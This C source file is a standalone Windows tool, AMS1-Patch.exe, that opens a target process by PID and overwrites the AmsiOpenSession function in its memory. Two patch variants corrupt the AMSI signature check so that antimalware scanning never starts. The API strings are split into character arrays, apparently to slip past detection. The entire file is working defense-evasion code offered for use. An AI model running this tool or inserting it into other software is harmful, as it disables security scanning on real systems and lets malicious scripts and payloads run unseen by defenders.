#include <Windows.h>
#include <stdio.h>
#pragma comment(lib, "ntdll")


#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

char ams1[] = { 'a','m','s','i','.','d','l','l',0 };
char ams10pen[] = { 'A','m','s','i','O','p','e','n','S','e','s','s','i','o','n',0 };

EXTERN_C NTSTATUS NtProtectVirtualMemory(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN OUT PSIZE_T RegionSize,
	IN ULONG NewProtect,
	OUT PULONG OldProtect);

EXTERN_C NTSTATUS NtWriteVirtualMemory(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress,
	IN PVOID Buffer,
	IN SIZE_T NumberOfBytesToWrite,
	OUT PSIZE_T NumberOfBytesWritten OPTIONAL);



void AMS1patch1(HANDLE hproc) {

	void* ptr = GetProcAddress(LoadLibraryA(ams1), ams10pen);
	INT_PTR ptr_0Val = *(INT_PTR*)((INT_PTR)ptr);

	// Before Patching:
	// 8139414d5349		:	cmp     dword ptr [rcx],49534D41h  => AMSI,AMSI
	// 753a				:	jne     amsi!AmsiOpenSession+0x4c  => Not Triggered
	// 

	char Patch[100];
	lstrcatA(Patch, "\x81\x39\x44\x31\x52\x4B\x75\x3a");

	printf("\n[+] The Patch : %p\n\n", *(INT_PTR*)Patch);

	DWORD OldProtect = 0;
	SIZE_T memPage = 0x1000;
	void* ptraddr = (void*)(((INT_PTR)ptr + 0xa));


	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus1)) {
		printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
		return ;
	}
	NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (LPVOID)((INT_PTR)ptr + 0xa), (PVOID)Patch, 8, (SIZE_T*)nullptr);
	if (!NT_SUCCESS(NtWriteStatus)) {
		printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
		return ;
	}
	NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus2)) {
		printf("[!] Failed in NtProtectVirtualMemory2 (%u)\n", GetLastError());
		return ;
	}

	printf("\nAfter Patching :\n ");
	printf("\t81394431524B\t\t		:	cmp     dword ptr [rcx],4B523144h  => AMSI,D1RK\n");
	printf("\t753a\t				:	jne     amsi!AmsiOpenSession+0x4c  => Triggered\n\n");
	
	printf("\n[+] AMSI patched !!\n\n");
}

void AMS1patch2(HANDLE hproc) {
	
	void* ptr = GetProcAddress(LoadLibraryA(ams1), ams10pen);
	INT_PTR ptr_0Val = *(INT_PTR*)((INT_PTR)ptr);



	// 0:  c7 01 44 31 52 4b       mov    DWORD PTR [rcx],0x4b523144 (D1RK)
	// 6:  90                      nop
	// 7 : 90                      nop
	char Patch[100];
	lstrcatA(Patch, "\xC7\x01\x44\x31\x52\x4B\x90\x90");

	printf("\n[+] The Patch : %p\n\n", *(INT_PTR*)Patch);

	DWORD OldProtect = 0;
	SIZE_T memPage = 0x1000;
	void* ptraddr = ptr;


	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus1)) {
		printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
		return;
	}
	NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (LPVOID)((INT_PTR)ptr), (PVOID)Patch, 8, (SIZE_T*)nullptr);
	if (!NT_SUCCESS(NtWriteStatus)) {
		printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
		return;
	}
	NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus2)) {
		printf("[!] Failed in NtProtectVirtualMemory2 (%u)\n", GetLastError());
		return;
	}
	printf("\n[+] After Patching :\n");
	printf("\tc7014431524b       mov    DWORD PTR [rcx],0x4b523144 (D1RK)\n");
	printf("\n[+] AMSI context header has been corrupted with \"D1RK\", AMS1 session Not Created !!\n");
	printf("\n[+] AMSI patched !!\n\n");
}

int main(int argc, char** argv) {

	HANDLE hProc;

	if (argc < 3) {
		printf("USAGE: AMS1-Patch.exe <PID> <Patch_Nbr, 1 or 2>\n");
		return 1;
	}
	
	hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, (DWORD)atoi(argv[1]));
	if (!hProc) {
		printf("Failed in OpenProcess (%u)\n", GetLastError());
		return 2;
	}
	

	if (atoi(argv[2]) == 1)
		AMS1patch1(hProc);
	else
		AMS1patch2(hProc);
	
	return 0;
	
}